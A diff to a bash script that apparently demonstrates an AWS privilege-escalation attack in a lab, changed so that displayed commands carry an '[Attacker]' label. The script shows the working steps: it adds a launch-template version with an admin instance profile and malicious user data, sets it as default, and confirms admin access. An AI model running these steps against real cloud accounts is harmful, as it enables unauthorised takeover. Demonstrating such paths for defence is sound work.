@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -93,7 +95,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -105,7 +107,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -113,7 +115,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -126,7 +128,7 @@ echo -e "${YELLOW}Step 5: Inspecting the victim launch template${NC}"
 echo "Target launch template: $VICTIM_TEMPLATE_NAME"
 echo ""
 
-show_cmd aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json
+show_cmd "Attacker" "aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json"
 TEMPLATE_INFO=$(aws ec2 describe-launch-templates \
     --region $AWS_REGION \
     --launch-template-names $VICTIM_TEMPLATE_NAME \
@@ -140,7 +142,7 @@ echo "Launch Template ID: $TEMPLATE_ID"
 echo "Current Default Version: $ORIGINAL_DEFAULT_VERSION"
 
 # Get current version details
-show_cmd aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json
+show_cmd "Attacker" "aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json"
 CURRENT_VERSION_INFO=$(aws ec2 describe-launch-template-versions \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -192,7 +194,7 @@ CURRENT_AMI=$(echo "$CURRENT_VERSION_INFO" | jq -r '.ImageId')
 CURRENT_INSTANCE_TYPE=$(echo "$CURRENT_VERSION_INFO" | jq -r '.InstanceType')
 
 # Create new version with admin profile and malicious user data
-show_attack_cmd aws ec2 create-launch-template-version --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --source-version "$ORIGINAL_DEFAULT_VERSION" --launch-template-data "{\"ImageId\": \"$CURRENT_AMI\", \"InstanceType\": \"$CURRENT_INSTANCE_TYPE\", \"IamInstanceProfile\": {\"Name\": \"$TARGET_ADMIN_PROFILE\"}, \"UserData\": \"$USER_DATA_B64\", \"InstanceMarketOptions\": {\"MarketType\": \"spot\", \"SpotOptions\": {\"MaxPrice\": \"0.02\", \"SpotInstanceType\": \"one-time\"}}}" --output json
+show_attack_cmd "Attacker" "aws ec2 create-launch-template-version --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --source-version "$ORIGINAL_DEFAULT_VERSION" --launch-template-data "{\"ImageId\": \"$CURRENT_AMI\", \"InstanceType\": \"$CURRENT_INSTANCE_TYPE\", \"IamInstanceProfile\": {\"Name\": \"$TARGET_ADMIN_PROFILE\"}, \"UserData\": \"$USER_DATA_B64\", \"InstanceMarketOptions\": {\"MarketType\": \"spot\", \"SpotOptions\": {\"MaxPrice\": \"0.02\", \"SpotInstanceType\": \"one-time\"}}}" --output json"
 NEW_VERSION_OUTPUT=$(aws ec2 create-launch-template-version \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -229,7 +231,7 @@ echo -e "${YELLOW}Step 8: Modifying launch template to set new version as defaul
 echo "Using ec2:ModifyLaunchTemplate to update the default version..."
 echo ""
 
-show_attack_cmd aws ec2 modify-launch-template --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --default-version "$NEW_VERSION_NUMBER" --output text
+show_attack_cmd "Attacker" "aws ec2 modify-launch-template --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --default-version "$NEW_VERSION_NUMBER" --output text"
 aws ec2 modify-launch-template \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -273,7 +275,7 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
 
     if [ "$INSTANCE_COUNT" -gt 0 ]; then
         INSTANCE_ID=$(echo "$ASG_INSTANCES" | jq -r '.[0].InstanceId')
-        show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text
+        show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
         INSTANCE_STATE=$(aws ec2 describe-instances \
             --region $AWS_REGION \
             --instance-ids $INSTANCE_ID \
@@ -338,7 +340,7 @@ echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
